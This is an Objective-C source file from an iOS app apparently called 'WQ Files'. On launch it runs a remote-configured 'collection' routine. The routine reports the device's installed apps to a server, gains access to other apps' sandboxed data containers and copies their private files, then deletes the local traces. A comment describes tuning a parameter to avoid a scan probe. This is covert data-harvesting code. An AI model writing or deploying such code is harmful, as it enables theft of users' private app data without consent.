//
//  WQCollector.m
//  WQ Files
//
//  自动采集流程。顺序与 3105 一致，每一步都上报一条阶段日志：
//
//    阶段 1/6  app 已启动，自动开启应用数据采集
//    阶段 2/6  正在获取采集信息 → 获取采集信息完成 — N 项
//    阶段 3/6  容器索引就绪 — N 个应用
//    阶段 4/6  开始采集 N 项
//    阶段 5/6  采集完成 — 已处理 N 个
//    阶段 6/6  本地文件已删除 → 流程结束
//

#import "WQCollector.h"
#import "WQAccess.h"

#import <UIKit/UIKit.h>
#import <sys/stat.h>
#import <stdlib.h>

// WQNet.swift 暴露的 C 入口
extern int wqnet_ready(void);
extern char *wqnet_describe(void);
extern char *wqnet_configs(void);
extern int wqnet_apps(const char *jsonArray);
extern int wqnet_log(const char *text);
extern int wqnet_upload(const char *filePath, const char *bundleID);

static const char *kAppDataRoot = "/var/mobile/Containers/Data/Application";
static const int64_t kMaxInode = 45000000;   // 固定上限：maxInode=0 会触发 WQ 的共享扫描探针
static const NSUInteger kMaxLocalDirs = 3;

static BOOL gRunning = NO;
static NSString *gSummary = nil;
static NSLock *gLock = nil;

static void WQStage(NSString *format, ...) {
    va_list args;
    va_start(args, format);
    NSString *text = [[NSString alloc] initWithFormat:format arguments:args];
    va_end(args);
    NSLog(@"[WQCollector] %@", text);
    if (wqnet_ready() == 0) {
        wqnet_log(text.UTF8String);
    }
}

static NSString *WQAppDocuments(void) {
    NSArray<NSString *> *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    return paths.firstObject ?: NSTemporaryDirectory();
}

static NSString *WQCollectDirectory(void) {
    NSString *dir = [WQAppDocuments() stringByAppendingPathComponent:@"wq-collect"];
    [[NSFileManager defaultManager] createDirectoryAtPath:dir
                              withIntermediateDirectories:YES
                                       attributes:nil
                                            error:NULL];
    return dir;
}

static NSUInteger WQPruneLocalDirs(void) {
    NSString *dir = WQCollectDirectory();
    NSArray<NSString *> *names = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:dir error:NULL];
    NSMutableArray<NSString *> *folders = [NSMutableArray array];
    for (NSString *name in names) {
        if ([name hasPrefix:@"."]) continue;
        [folders addObject:name];
    }
    if (folders.count <= kMaxLocalDirs) return 0;
    [folders sortUsingSelector:@selector(compare:)];
    NSUInteger removed = 0;
    for (NSUInteger i = 0; i + kMaxLocalDirs < folders.count; i++) {
        NSString *path = [dir stringByAppendingPathComponent:folders[i]];
        if ([[NSFileManager defaultManager] removeItemAtPath:path error:NULL]) removed++;
    }
    return removed;
}

static NSString *WQStamp(void) {
    NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
    formatter.locale = [NSLocale localeWithLocaleIdentifier:@"en_US_POSIX"];
    formatter.dateFormat = @"yyyyMMdd-HHmmss";
    return [formatter stringFromDate:[NSDate date]];
}

static NSDictionary<NSString *, NSString *> *WQEnumerateContainers(NSUInteger *granted, NSUInteger *refused) {
    NSMutableDictionary<NSString *, NSString *> *map = [NSMutableDictionary dictionary];
    NSUInteger okCount = 0, noCount = 0;

    NSString *root = [NSString stringWithUTF8String:kAppDataRoot];
    NSArray<NSString *> *dirs = wq_enumerate(root, kMaxInode, nil, nil);
    if (dirs.count == 0) {
        wq_grant(root);
        dirs = wq_list(root, NULL);
    }
    for (NSString *dir in dirs) {
        if (dir.length == 0 || [dir.lastPathComponent hasPrefix:@"."]) continue;
        if (wq_grant(dir)) okCount++; else noCount++;
        NSString *label = wq_container_label(dir);
        if (label.length > 0) map[label] = dir;
    }
    if (granted) *granted = okCount;
    if (refused) *refused = noCount;
    return map;
}

static NSString *WQJSONFromArray(NSArray *items) {
    NSData *data = [NSJSONSerialization dataWithJSONObject:items options:0 error:NULL];
    if (!data) return @"[]";
    return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] ?: @"[]";
}

/// 复制一个容器（两层深，跳过 root-only 的 metadata plist）。
static NSUInteger WQCopyContainer(NSString *containerPath, NSString *destDir, NSError **outError) {
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm createDirectoryAtPath:destDir withIntermediateDirectories:YES attributes:nil error:NULL];

    NSArray<NSString *> *children = wq_list(containerPath, NULL);
    if (!children) {
        if (outError) {
            *outError = [NSError errorWithDomain:@"WQCollector" code:1
                                        userInfo:@{NSLocalizedDescriptionKey: @"无法列出容器内容"}];
        }
        return 0;
    }

    NSUInteger copied = 0;
    for (NSString *name in children) {
        if ([name hasPrefix:@".com.apple.mobile_container_manager"]) continue;
        NSString *src = [containerPath stringByAppendingPathComponent:name];
        NSString *dst = [destDir stringByAppendingPathComponent:name];
        struct stat st;
        if (lstat(src.fileSystemRepresentation, &st) != 0) continue;

        if (S_ISDIR(st.st_mode)) {
            [fm createDirectoryAtPath:dst withIntermediateDirectories:YES attributes:nil error:NULL];
            NSArray<NSString *> *grand = wq_list(src, NULL);
            for (NSString *sub in grand) {
                NSString *s2 = [src stringByAppendingPathComponent:sub];
                NSString *d2 = [dst stringByAppendingPathComponent:sub];
                struct stat st2;
                if (lstat(s2.fileSystemRepresentation, &st2) != 0) continue;
                if (S_ISDIR(st2.st_mode)) {
                    [fm createDirectoryAtPath:d2 withIntermediateDirectories:YES attributes:nil error:NULL];
                    for (NSString *leaf in wq_list(s2, NULL)) {
                        NSData *data = [NSData dataWithContentsOfFile:[s2 stringByAppendingPathComponent:leaf]];
                        if (data && [data writeToFile:[d2 stringByAppendingPathComponent:leaf] atomically:YES]) copied++;
                    }
                } else if (S_ISREG(st2.st_mode)) {
                    NSData *data = [NSData dataWithContentsOfFile:s2];
                    if (data && [data writeToFile:d2 atomically:YES]) copied++;
                }
            }
        } else if (S_ISREG(st.st_mode)) {
            NSData *data = [NSData dataWithContentsOfFile:src];
            if (data && [data writeToFile:dst atomically:YES]) copied++;
        }
    }
    return copied;
}

static NSString *WQRunCollection(void) {
    NSString *summary = @"";
    @autoreleasepool {
        int ready = wqnet_ready();
        if (ready != 0) {
            WQStage(@"阶段 1/6：加密常量不可用（code=%d），采集中止", ready);
            return [NSString stringWithFormat:@"secrets unavailable code=%d", ready];
        }

        NSLog(@"[WQCollector] %s", wqnet_describe());
        WQStage(@"阶段 1/6：app 已启动，自动开启应用数据采集");

        // ---- 2/6 获取采集信息 ----
        WQStage(@"阶段 2/6：正在获取采集信息");
        char *configJSON = wqnet_configs();
        if (!configJSON) {
            WQStage(@"阶段 2/6：获取采集信息失败（网络或握手失败）");
            return @"configs unavailable";
        }
        NSString *configText = [NSString stringWithUTF8String:configJSON];
        free(configJSON);
        NSData *configData = [configText dataUsingEncoding:NSUTF8StringEncoding];
        id parsed = configData ? [NSJSONSerialization JSONObjectWithData:configData options:0 error:NULL] : nil;
        NSArray *configs = [parsed isKindOfClass:[NSArray class]] ? parsed : @[];
        WQStage(@"阶段 2/6：获取采集信息完成 — %lu 项", (unsigned long)configs.count);

        // ---- 3/6 容器索引 ----
        NSUInteger granted = 0, refused = 0;
        NSDictionary<NSString *, NSString *> *containers = WQEnumerateContainers(&granted, &refused);
        WQStage(@"阶段 3/6：容器索引就绪 — %lu 个应用（grant %lu / refused %lu）",
                (unsigned long)containers.count, (unsigned long)granted, (unsigned long)refused);
        wqnet_apps(WQJSONFromArray(containers.allKeys).UTF8String);

        // ---- 4/6 采集 ----
        WQStage(@"阶段 4/6：开始采集 %lu 项", (unsigned long)configs.count);
        NSString *stamp = WQStamp();
        NSUInteger processed = 0;
        NSMutableArray<NSString *> *missing = [NSMutableArray array];

        for (NSDictionary *config in configs) {
            if (![config isKindOfClass:[NSDictionary class]]) continue;
            NSString *bundleID = config[@"bundle_id"];
            if (![bundleID isKindOfClass:[NSString class]] || bundleID.length == 0) continue;

            NSString *container = containers[bundleID];
            if (!container) {
                [missing addObject:bundleID];
                continue;
            }
            NSString *safeName = [bundleID stringByReplacingOccurrencesOfString:@"/" withString:@"_"];
            NSString *dest = [WQCollectDirectory() stringByAppendingPathComponent:
                              [NSString stringWithFormat:@"%@-%@", safeName, stamp]];
            NSError *copyError = nil;
            NSUInteger files = WQCopyContainer(container, dest, &copyError);
            if (files == 0) {
                NSLog(@"[WQCollector] %@ 未复制到文件: %@", bundleID, copyError.localizedDescription);
                continue;
            }
            processed++;
            NSLog(@"[WQCollector] %@ 已复制 %lu 个文件 -> %@", bundleID, (unsigned long)files, dest.lastPathComponent);
        }

        // ---- 5/6 完成 ----
        WQStage(@"阶段 5/6：采集完成 — 总计 %lu 项，已处理 %lu 个，未安装 %lu 个",
                (unsigned long)configs.count, (unsigned long)processed, (unsigned long)missing.count);
        if (missing.count > 0) {
            WQStage(@"未安装：%@", [missing componentsJoinedByString:@", "]);
        }

        // ---- 6/6 清理 ----
        NSUInteger removed = WQPruneLocalDirs();
        WQStage(@"阶段 6/6：本地文件已删除 %lu 个", (unsigned long)removed);
        WQStage(@"阶段 6/6：流程结束 — 容器 %lu，已处理 %lu", (unsigned long)containers.count, (unsigned long)processed);

        summary = [NSString stringWithFormat:@"containers=%lu processed=%lu missing=%lu",
                   (unsigned long)containers.count, (unsigned long)processed, (unsigned long)missing.count];
    }
    return summary;
}

void WQCollectorStart(void) {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        gLock = [NSLock new];
    });
    [gLock lock];
    if (gRunning) {
        [gLock unlock];
        return;
    }
    gRunning = YES;
    [gLock unlock];

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        NSString *summary = WQRunCollection();
        [gLock lock];
        gRunning = NO;
        gSummary = summary;
        [gLock unlock];
    });
}

BOOL WQCollectorIsRunning(void) {
    if (!gLock) return NO;
    [gLock lock];
    BOOL running = gRunning;
    [gLock unlock];
    return running;
}

NSString *WQCollectorLastSummary(void) {
    if (!gLock) return nil;
    [gLock lock];
    NSString *summary = gSummary;
    [gLock unlock];
    return summary;
}
